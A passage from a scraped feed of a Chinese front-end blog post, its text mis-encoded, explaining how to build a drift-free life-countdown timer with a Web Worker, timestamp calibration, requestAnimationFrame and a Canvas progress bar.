pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ‹’ç» <code>setInterval</code>ï¼æ‰‹æ’•â€œæ­»äº†ä¹ˆâ€ç”Ÿå‘½å€’è®¡æ—¶ï¼Œå¸¦ä½ çœ‹çœ‹ 60FPS ä¸‹çš„ Web Worker ä¼˜é›…å¤šçº¿ç¨‹</h2>
<blockquote>
<p><strong>æ‘˜è¦</strong>ï¼šè¿˜åœ¨ç”¨ <code>setInterval</code> å†™å€’è®¡æ—¶ï¼Ÿéš¾æ€ªä½ çš„ App åˆ‡åˆ°åå°å°±â€œå‡æ­»â€ã€‚ä»Šå¤©ä»â€œæ­»äº†ä¹ˆâ€APP çš„æ ¸å¿ƒç—›ç‚¹å‡ºå‘ï¼Œå¸¦ä½ ç”¨ Web Worker + RAF é‡æ„é«˜ç²¾åº¦è®¡æ—¶å™¨ã€‚æ‹’ç»æ—¶é—´åå·®ï¼Œè¿™æ‰æ˜¯ç†å·¥ç”·å¯¹å¾…ç”Ÿå‘½çš„ä¸¥è°¨æ€åº¦ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/454709f8971c47b0a8a2493115d78c3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgenpwcGVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769017822&amp;x-signature=%2FNu9SeM2UOW0GTC7GYBGBhnqfhk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">å†™åœ¨å‰é¢ï¼šç„¦è™‘çš„å…·è±¡åŒ– ğŸ•’</h3>
<p>æœ€è¿‘æœ‹å‹åœˆè¢«ä¸€æ¬¾å«â€œæ­»äº†ä¹ˆâ€çš„ APP åˆ·å±äº†ï¼ˆå…¶å®å°±æ˜¯å„ç§ Life Countdown ç±»åº”ç”¨ï¼‰ã€‚çœ‹ç€å±å¹•ä¸Šé‚£ä¸ªä¸æ–­è·³åŠ¨çš„æ•°å­—ï¼Œç²¾ç¡®åˆ°æ¯«ç§’åœ°è®¡ç®—ç€ä½ ç¦»â€œåˆ åº“è·‘è·¯â€ï¼ˆåˆ’æ‰ï¼‰â€”â€”ç¦»â€œç™¾å¹´ä¹‹åâ€è¿˜å‰©å¤šå°‘æ—¶é—´ï¼Œç¡®å®è®©äººæœ‰ä¸€ç§<strong>è¢«æ—¶é—´è¿½ç€ç </strong>çš„ç´§è¿«æ„Ÿã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªâ€œä»£ç æ´ç™–æ‚£è€…â€ï¼Œæˆ‘ç¬¬ä¸€æ—¶é—´ä¸‹è½½ä½“éªŒäº†ä¸€ä¸‹ã€‚UI å¾ˆé…·ï¼Œä½†å½“æˆ‘æŠŠå®ƒæŒ‚åœ¨åå°ï¼Œåˆ·äº†ä¸€ä¼šå„¿æ˜é‡‘å†åˆ‡å›æ¥æ—¶ï¼Œå‘ç°å€’è®¡æ—¶ç«Ÿç„¶<strong>å¡é¡¿äº†ä¸€ç¬é—´</strong>ï¼Œç„¶åæ‰è·³åˆ°äº†æ­£ç¡®çš„æ—¶é—´ã€‚</p>
<p><strong>ä¸èƒ½å¿ï¼ç»å¯¹ä¸èƒ½å¿ï¼</strong> ğŸ˜¡</p>
<p>å¯¹äºæ™®é€šç”¨æˆ·è¿™å«â€œå¡é¡¿â€ï¼Œå¯¹äºæˆ‘ä»¬å¼€å‘è€…æ¥è¯´ï¼Œè¿™æ˜¯<strong>å¯¹ Event Loop çš„äºµæ¸</strong>ï¼å¾ˆå¤šåŒå­¦åœ¨å¤§ä¸€å­¦ JS çš„æ—¶å€™ï¼Œè€å¸ˆéƒ½æ•™è¿‡ <code>setInterval</code> åšå€’è®¡æ—¶ï¼Œä½†ä»Šå¤©æˆ‘è¦å‘Šè¯‰ä½ ï¼š<strong>åœ¨ç”Ÿäº§ç¯å¢ƒçš„é«˜ç²¾åº¦å€’è®¡æ—¶é‡Œï¼Œ<code>setInterval</code> å°±æ˜¯ä¸ªéª—å­ã€‚</strong></p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥æ‰’å¼€â€œæ—¶é—´â€çš„åº•è£¤ï¼Œç”¨ <strong>Web Worker</strong> + <strong>requestAnimationFrame</strong> æ‰‹æ“ä¸€ä¸ª<strong>æ°¸ä¸åå·®ã€ä¸èˆ¬é¡ºæ»‘</strong>çš„ç”Ÿå‘½å€’è®¡æ—¶ç»„ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-2">1. ä¸ºä»€ä¹ˆ <code>setInterval</code> æ˜¯ä¸ªâ€œæ¸£ç”·â€ï¼ŸğŸ’”</h3>
<p>åœ¨é¢è¯•çš„æ—¶å€™ï¼Œå¦‚æœé¢è¯•å®˜é—®ä½ ï¼šâ€œsetInterval(fn, 1000) çœŸçš„æ˜¯æ¯ 1000ms æ‰§è¡Œä¸€æ¬¡å—ï¼Ÿâ€</p>
<p>ä½ è¦æ˜¯æ•¢è¯´æ˜¯ï¼Œé‚£åŸºæœ¬å°±å›å»ç­‰é€šçŸ¥äº†ã€‚</p>
<h4 data-id="heading-3">1.1 å•çº¿ç¨‹çš„â€œé“¶è¡ŒæŸœå°â€æ‚²å‰§</h4>
<p>JS çš„ä¸»çº¿ç¨‹å°±åƒåªæœ‰ä¸€ä¸ªæŸœå°çš„é“¶è¡Œã€‚</p>
<p>setInterval å¹¶ä¸æ˜¯â€œå‡†æ—¶æ‰§è¡Œâ€ï¼Œè€Œæ˜¯â€œå‡†æ—¶æŠŠä»»åŠ¡æ‰”è¿›æ’é˜Ÿå¤§å…ï¼ˆä»»åŠ¡é˜Ÿåˆ—ï¼‰â€ã€‚</p>
<p>å¦‚æœæŸœå°æ­£åœ¨å¤„ç†ä¸€ä¸ªå¤§å®¢æˆ·ï¼ˆæ¯”å¦‚ä¸€æ®µè€—æ—¶çš„ <code>for</code> å¾ªç¯ï¼Œæˆ–è€…å¤æ‚çš„ DOM æ¸²æŸ“ï¼‰ï¼Œä½ çš„å®šæ—¶å™¨å›è°ƒå°±å¾—åœ¨åé¢å¹²ç­‰ã€‚</p>
<blockquote>
<p>âš ï¸ <strong>é«˜èƒ½é¢„è­¦</strong>ï¼šè¿™å°±æ˜¯è‘—åçš„ <strong>Event Loop é˜»å¡</strong>ã€‚ä½ ä»¥ä¸ºè¿‡äº† 1 ç§’ï¼Œå®é™…å¯èƒ½å·²ç»è¿‡äº† 1.5 ç§’ã€‚</p>
</blockquote>
<h4 data-id="heading-4">1.2 æµè§ˆå™¨çš„â€œèŠ‚èƒ½æ¨¡å¼â€èƒŒåˆº</h4>
<p>æ›´å‘çš„æ˜¯ï¼Œä¸ºäº†çœç”µï¼Œç°ä»£æµè§ˆå™¨ï¼ˆChrome/Safariï¼‰å¯¹<strong>åå°æ ‡ç­¾é¡µ</strong>æå…¶æ®‹å¿ã€‚å¦‚æœä½ çš„é¡µé¢åˆ‡åˆ°äº†åå°ï¼Œ<code>setInterval</code> çš„æ‰§è¡Œé¢‘ç‡ä¼šè¢«å¼ºè¡Œé™é¢‘åˆ° <strong>1 ç§’ç”šè‡³æ›´ä¹…</strong>ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘åˆ‡å› APP æ—¶ä¼šçœ‹åˆ°æ—¶é—´â€œè·³å˜â€çš„åŸå› â€”â€”<strong>å› ä¸ºè®¡æ—¶å™¨åœ¨åå°â€œç¡ç€â€äº†ã€‚</strong></p>
<hr/>
<h3 data-id="heading-5">2. ç ´å±€ï¼šWeb Worker â€”â€” æ‰¾ä¸ªâ€œåˆ†èº«â€æ¥è®¡æ—¶ ğŸ•µï¸â€â™‚ï¸</h3>
<p>æ—¢ç„¶ä¸»çº¿ç¨‹ï¼ˆUI çº¿ç¨‹ï¼‰åˆå¿™åˆä¸é è°±ï¼Œé‚£æˆ‘ä»¬å°±å¼€ä¸ªâ€œå¤–æŒ‚â€ã€‚</p>
<p><strong>Web Worker</strong> å…è®¸æˆ‘ä»¬åœ¨ä¸»çº¿ç¨‹ä¹‹å¤–è¿è¡Œè„šæœ¬ã€‚å®ƒå°±åƒæ˜¯é“¶è¡Œé‡Œçš„ <strong>VIP ä¸“å±æŸœå°</strong>ï¼Œå®Œå…¨ä¸å—ä¸»çº¿ç¨‹ DOM æ¸²æŸ“å’Œ UI å¡é¡¿çš„å½±å“ã€‚å“ªæ€•ä¸»çº¿ç¨‹åœ¨è¿›è¡Œå¤æ‚çš„ Canvas æ¸²æŸ“ï¼ŒWorker é‡Œçš„è®¡æ—¶å™¨ä¾ç„¶ç¨³å¦‚è€ç‹—ã€‚</p>
<h4 data-id="heading-6">2.1 æ¶æ„è®¾è®¡ï¼šä¸»ä»†åˆ†ç¦»</h4>
<p>æˆ‘ä»¬è¦å®ç°ä¸€ä¸ª<strong>ä¼˜é›…çš„æ¶æ„</strong>ï¼š</p>
<ol>
<li><strong>Worker çº¿ç¨‹</strong>ï¼šåªè´Ÿè´£â€œæ»´ç­”â€ï¼Œæ¯éš”ä¸€æ®µå›ºå®šæ—¶é—´ï¼ˆæ¯”å¦‚ 100msï¼‰å‘ä¸»çº¿ç¨‹å‘ä¸€ä¸ªâ€œå¿ƒè·³åŒ…â€ã€‚</li>
<li><strong>Main çº¿ç¨‹</strong>ï¼šè´Ÿè´£â€œæ¸²æŸ“â€ï¼Œæ¥æ”¶åˆ°å¿ƒè·³åï¼Œåˆ©ç”¨ <code>requestAnimationFrame</code> æ›´æ–° UIã€‚</li>
</ol>
<p>è¿™ç§æ¨¡å¼åœ¨æ¸¸æˆå¼€å‘ä¸­å« <strong>â€œé€»è¾‘ä¸æ¸²æŸ“åˆ†ç¦»â€</strong> ï¼Œéå¸¸é«˜çº§ã€‚ğŸ˜</p>
<hr/>
<h3 data-id="heading-7">3. Talk is Cheap, Show me the Code ğŸ’»</h3>
<p>æˆ‘ä»¬è¦å®ç°ä¸€ä¸ª Hookï¼š<code>useLifeCountdown</code>ã€‚</p>
<h4 data-id="heading-8">Step 1: ç¼–å†™é‚£ä¸ªâ€œä¸çŸ¥ç–²å€¦â€çš„ Worker</h4>
<p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ª <code>timer.worker.js</code>ã€‚è¿™æ˜¯æˆ‘ä»¬çš„<strong>ç‹¬ç«‹æ—¶é—´å®ˆæŠ¤è€…</strong>ã€‚</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// timer.worker.js

let <span class="hljs-attr">timerId</span> = null<span class="hljs-comment">;</span>
let <span class="hljs-attr">interval</span> = <span class="hljs-number">1000</span><span class="hljs-comment">;</span>

// ç›‘å¬ä¸»çº¿ç¨‹æŒ‡ä»¤
<span class="hljs-attr">self.onmessage</span> = (e) =&gt; {
  const { action, payload } = e.data<span class="hljs-comment">;</span>

  if (<span class="hljs-attr">action</span> === <span class="hljs-string">'START'</span>) {
    <span class="hljs-attr">interval</span> = payload || <span class="hljs-number">1000</span><span class="hljs-comment">;</span>
    // ğŸ’¡ å³ä½¿åœ¨è¿™é‡Œç”¨ setIntervalï¼Œç”±äº Worker æ˜¯ç‹¬ç«‹çº¿ç¨‹
    // å®ƒä¸ä¼šå—ä¸»çº¿ç¨‹ UI å¡é¡¿å½±å“ï¼Œä¹Ÿä¸ä¼šå› ä¸ºé¡µé¢åå°è€Œè½»æ˜“é™é¢‘ï¼ˆå¤§éƒ¨åˆ†æƒ…å†µï¼‰
    <span class="hljs-attr">timerId</span> = setInterval(() =&gt; {
      // åªå‘é€â€œè„‰å†²â€ï¼Œä¸å‘é€å…·ä½“æ—¶é—´ï¼Œå‡å°‘æ•°æ®ä¼ è¾“é‡
      self.postMessage({ type: 'TICK' })<span class="hljs-comment">;</span>
    }, interval)<span class="hljs-comment">;</span>
  } else if (<span class="hljs-attr">action</span> === <span class="hljs-string">'STOP'</span>) {
    if (timerId) {
      clearInterval(timerId)<span class="hljs-comment">;</span>
      <span class="hljs-attr">timerId</span> = null<span class="hljs-comment">;</span>
    }
  }
}<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-9">Step 2: ä¸»çº¿ç¨‹çš„â€œä¼˜é›…â€æ¥æ”¶ (Vue3/React é€šç”¨é€»è¾‘)</h4>
<p>è¿™é‡Œç”¨ TypeScript å†™ä¸€ä¸ª Class æ¥å°è£…ï¼Œæ˜¾å¾—å’±ä»¬æ¯”è¾ƒä¸“ä¸šã€‚</p>
<p>TypeScript</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// PreciseTimer.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PreciseTimer</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">worker</span>: <span class="hljs-title class_">Worker</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">startTime</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">duration</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// å€’è®¡æ—¶æ€»æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">remaining: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">duration: <span class="hljs-built_in">number</span>, callback: (time: <span class="hljs-built_in">number</span>) =&gt; <span class="hljs-built_in">void</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">duration</span> = duration;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">callback</span> = callback;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

    <span class="hljs-comment">// ğŸ’¡ å®ä¾‹åŒ– Worker (æ³¨æ„ Vite/Webpack çš„å¼•å…¥æ–¹å¼å¯èƒ½ä¸åŒ)</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">worker</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'./timer.worker.js'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>));
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">worker</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">data</span>.<span class="hljs-property">type</span> === <span class="hljs-string">'TICK'</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">syncTime</span>();
      }
    };
  }

  <span class="hljs-comment">// æ ¸å¿ƒï¼šåŸºäºç³»ç»Ÿæ—¶é—´çš„æ ¡å‡†æœºåˆ¶</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">syncTime</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-comment">// é€å»çš„æ—¶é—´</span>
    <span class="hljs-keyword">const</span> elapsed = now - <span class="hljs-variable language_">this</span>.<span class="hljs-property">startTime</span>; 
    <span class="hljs-comment">// å‰©ä½™æ—¶é—´</span>
    <span class="hljs-keyword">const</span> remaining = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">duration</span> - elapsed);

    <span class="hljs-comment">// ğŸ”¥ é‡ç‚¹ï¼šè™½ç„¶ Worker è§¦å‘äº† updateï¼Œä½†æˆ‘ä»¬è¦ç”¨ requestAnimationFrame </span>
    <span class="hljs-comment">// ç¡®ä¿ UI æ›´æ–°ä¸å±å¹•åˆ·æ–°ç‡åŒæ­¥ï¼Œé¿å…ç”»é¢æ’•è£‚</span>
    <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callback</span>(remaining);
    });

    <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stop</span>();
    }
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">start</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å‘Šè¯‰ Workerï¼šæ¯ 16ms (çº¦ 60FPS) å«æˆ‘ä¸€æ¬¡</span>
    <span class="hljs-comment">// å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥è®¾ç½®å¾—å¤§ä¸€ç‚¹ï¼Œæ¯”å¦‚ 50msï¼Œå› ä¸º syncTime ä¼šè®¡ç®—ç²¾å‡†æ’å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">worker</span>.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">action</span>: <span class="hljs-string">'START'</span>, <span class="hljs-attr">payload</span>: <span class="hljs-number">20</span> }); 
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">stop</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">worker</span>.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">action</span>: <span class="hljs-string">'STOP'</span> });
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">worker</span>.<span class="hljs-title function_">terminate</span>(); <span class="hljs-comment">// æ€æ‰ Workerï¼Œé‡Šæ”¾å†…å­˜</span>
  }
}
</code></pre>
<blockquote>
<p>ğŸ’¡ æå®¢ç»†èŠ‚ï¼š</p>
<p>ç»†å¿ƒçš„åŒå­¦å‘ç°äº†ï¼Œæˆ‘åœ¨ syncTime é‡Œé‡æ–°è®¡ç®—äº† Date.now() - startTimeã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšï¼Ÿ</p>
<p>å› ä¸º Worker çš„ setInterval è™½ç„¶ç¨³å®šï¼Œä½†é•¿æœŸè¿è¡Œä¾ç„¶ä¼šæœ‰å¾®å°çš„ç´¯ç§¯è¯¯å·®ã€‚â€œæ—¶é—´æˆ³å·®å€¼æ³•â€ æ˜¯æ¶ˆé™¤è¯¯å·®çš„ç»ˆæå¥¥ä¹‰â€”â€”æ— è®ºä¸­é—´ tick æ­¤æ—¶å‡†ä¸å‡†ï¼Œæˆ‘æ¯æ¬¡è®¡ç®—çš„éƒ½æ˜¯ç‰©ç†ä¸–ç•Œçš„ç»å¯¹æ—¶é—´å·®ã€‚è¿™å°±æ˜¯**â€œæ— çŠ¶æ€â€**è®¡æ—¶çš„ç²¾é«“ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">4. è§†è§‰å±‚ï¼šè®©ç„¦è™‘â€œæµåŠ¨â€èµ·æ¥ (Canvas ç²’å­) ğŸ¨</h3>
<p>æœ‰äº†ç²¾å‡†çš„æ—¶é—´å†…æ ¸ï¼Œå‰©ä¸‹çš„å°±æ˜¯çš®å›Šäº†ã€‚ä¸ºäº†è‡´æ•¬â€œæ­»äº†ä¹ˆâ€ï¼Œæˆ‘ä»¬ä¸ç”¨æ¯ç‡¥çš„ <code>&lt;div&gt;</code> æ–‡å­—ï¼Œæˆ‘ä»¬ç”¨ Canvas ç”»ä¸€ä¸ª<strong>ç”Ÿå‘½è¿›åº¦æ¡</strong>ã€‚</p>
<p><em>(ä¸ºäº†ä¸å ç¯‡å¹…ï¼Œè¿™é‡Œåªæ”¾æ ¸å¿ƒæ¸²æŸ“é€»è¾‘)</em></p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">drawLifeBar</span>(ctx, percentage) {
  <span class="hljs-comment">// æ¸…ç©ºç”»å¸ƒ</span>
  ctx<span class="hljs-selector-class">.clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height);
  
  <span class="hljs-comment">// æ¸å˜è‰²ï¼šä»ç”Ÿæœºå‹ƒå‹ƒçš„ç»¿ -&gt; ç„¦è™‘çš„é»„ -&gt; ç»æœ›çš„çº¢</span>
  const gradient = ctx<span class="hljs-selector-class">.createLinearGradient</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, <span class="hljs-number">0</span>);
  gradient<span class="hljs-selector-class">.addColorStop</span>(<span class="hljs-number">0</span>, '#<span class="hljs-number">4</span>ade80'); <span class="hljs-comment">// Green</span>
  gradient<span class="hljs-selector-class">.addColorStop</span>(<span class="hljs-number">0.5</span>, '#facc15'); <span class="hljs-comment">// Yellow</span>
  gradient<span class="hljs-selector-class">.addColorStop</span>(<span class="hljs-number">1</span>, '#ef4444'); <span class="hljs-comment">// Red</span>
  
  ctx<span class="hljs-selector-class">.fillStyle</span> = gradient;
  
  <span class="hljs-comment">// ä½¿ç”¨è´å¡å°”æ›²çº¿ç”»å‡ºæ¶²ä½“çš„æµåŠ¨æ„Ÿ</span>
  <span class="hljs-comment">// è¿™é‡Œçš„ offset å¯ä»¥æ ¹æ® performance.now() åŠ¨æ€å˜åŒ–ï¼Œäº§ç”Ÿæ³¢æµªæ•ˆæœ</span>
  ctx<span class="hljs-selector-class">.beginPath</span>();
  ctx<span class="hljs-selector-class">.moveTo</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  ctx<span class="hljs-selector-class">.lineTo</span>(width * percentage, <span class="hljs-number">0</span>);
  ctx<span class="hljs-selector-class">.lineTo</span>(width * percentage, height);
  ctx<span class="hljs-selector-class">.lineTo</span>(<span class="hljs-number">0</span>, height);
  ctx<span class="hljs-selector-class">.fill</span>();
}
</code></pre>
<p>å½“ PreciseTimer çš„å›è°ƒè§¦å‘æ—¶ï¼Œæˆ‘ä»¬å°† remaining / total ä¼ ç»™è¿™ä¸ª drawLifeBarã€‚</p>
<p>ä½ ä¼šå‘ç°ï¼Œå“ªæ€•ä½ æ­¤æ—¶åœ¨ç‹‚æ‹–æµè§ˆå™¨çª—å£ï¼Œæˆ–è€…å¹¶åœ¨å‡ åä¸ª Tab é¡µä¸­åå¤æ¨ªè·³ï¼Œè¿™ä¸ªè¿›åº¦æ¡çš„æ¨è¿›ä¾ç„¶ç¨³å¦‚æ³°å±±ï¼Œä¸æ»‘å¦‚å¾·èŠ™ã€‚</p>
<hr/>
<h3 data-id="heading-11">æ€»ç»“ä¸å‡åï¼šæŠ€æœ¯ä¹‹å¤–çš„æ€è€ƒ ğŸ¤”</h3>
<p>è¿™å°±æ˜¯æˆ‘ä»¬ä½œä¸ºæŠ€æœ¯äººå¯¹â€œç”Ÿå‘½å€’è®¡æ—¶â€çš„å›åº”ã€‚</p>
<p>æˆ‘ä»¬ç”¨ <strong>Web Worker</strong> å¯¹æŠ—äº†æµè§ˆå™¨çš„åå°èŠ‚æµï¼Œç”¨ <strong>æ—¶é—´æˆ³å·®å€¼</strong> å¯¹æŠ—äº†è¿è¡Œæ—¶çš„ç´¯ç§¯è¯¯å·®ï¼Œç”¨ <strong>RAF</strong> å¯¹æŠ—äº†è§†è§‰å¡é¡¿ã€‚</p>
<p>æˆ‘ä»¬æ€»æ˜¯è¯•å›¾åœ¨ä»£ç é‡Œè¿½æ±‚ <strong>0ms çš„è¯¯å·®</strong>ï¼Œè¿½æ±‚ <strong>O(1) çš„å¤æ‚åº¦</strong>ã€‚ä½†å›åˆ°ç°å®ï¼Œæˆ‘ä»¬è‡ªå·±äººç”Ÿçš„â€œå€’è®¡æ—¶â€â€”â€”é‚£ä¸ªæœ€ç»ˆçš„ <code>clearInterval</code>ï¼Œå´æ˜¯æ— æ³•é‡æ„çš„ã€‚</p>
<p><strong>â€œæ­»äº†ä¹ˆâ€APP ç«çˆ†çš„èƒŒåï¼Œä¸æ˜¯å› ä¸ºæŠ€æœ¯å¤šç‰›ï¼Œè€Œæ˜¯å®ƒæˆ³ä¸­äº†å½“ä»£å¹´è½»äººçš„â€œæ—¶é—´ç„¦è™‘â€ã€‚</strong></p>
<p>æ‰€ä»¥ï¼Œå†™å®Œè¿™ä¸ª Demoï¼Œæˆ‘åˆä¸Šç”µè„‘ï¼Œå†³å®šä»Šæ™šä¸ä¿®é‚£ä¸ªè¯¥æ­»çš„ Bug äº†ã€‚
äººç”Ÿè‹¦çŸ­ï¼Œå¯¹è€å·±å¥½ä¸€ç‚¹ï¼Œå‡ºå»åƒä¸ªå®µå¤œçŠ’åŠ³ä¸€ä¸‹è€å·±ï¼Œå¥½å¥½ä¼‘æ¯ä¸€ä¸‹ï¼ˆæœ‰ç©ºè®°å¾—ç»™è€å¦ˆæ‰“ç”µè¯ï¼‰ã€‚</p>
<p><strong>æ¯•ç«Ÿï¼Œä»£ç å¯ä»¥å›æ»šï¼Œäººç”Ÿåªæœ‰ä¸€æ¬¡ Commitã€‚</strong></p>
<hr/>
<h4 data-id="heading-12">äº’åŠ¨æ—¶åˆ» ğŸ’¬</h4>
<blockquote>
<p><strong>ä½ çš„â€œç”Ÿå‘½å€’è®¡æ—¶â€è¿˜å‰©å¤šå°‘ï¼Ÿ</strong></p>
<ol>
<li>ä¸åˆ° 30%ï¼Œæ±‚æ±‚åˆ«å·äº†ï¼Œèººå¹³å§ ğŸ›Œ</li>
<li>åˆšè¿‡ 20%ï¼Œæ‰¶æˆ‘èµ·æ¥ï¼Œæˆ‘è¿˜èƒ½å­¦ï¼ğŸ“š</li>
<li><strong>æœ¬äºº</strong>ï¼šæˆ‘è§‰å¾—æˆ‘å’Œå‰ç«¯åŠ ä¸€èµ·è¿˜èƒ½å†æ´» 500 å¹´ï¼ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰</li>
</ol>
<p><strong>ç å­—ä¸æ˜“ï¼Œå¦‚æœä½ è§‰å¾—è¿™ä¸ª <code>Worker</code> æ–¹æ¡ˆæœ‰ç‚¹ä¸œè¥¿ï¼Œç»™å°è€å¼Ÿç‚¹ä¸ªèµå§ï¼ğŸ‘</strong></p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Livewire4 æ­£å¼å‘å¸ƒï¼PHP ä¹Ÿå¯ä»¥æ— éœ€å†™ä¸€è¡Œ Javascript ä»£ç å°±èƒ½å®ç° Vue çš„åŠŸèƒ½]]></title>    <link>https://juejin.cn/post/7594832320030801963</link>    <guid>https://juejin.cn/post/7594832320030801963</guid>    <pubDate>2026-01-14T23:32:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594832320030801963" data-draft-id="7595033052796469289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Livewire4 æ­£å¼å‘å¸ƒï¼PHP ä¹Ÿå¯ä»¥æ— éœ€å†™ä¸€è¡Œ Javascript ä»£ç å°±èƒ½å®ç° Vue çš„åŠŸèƒ½"/> <meta itemprop="keywords" 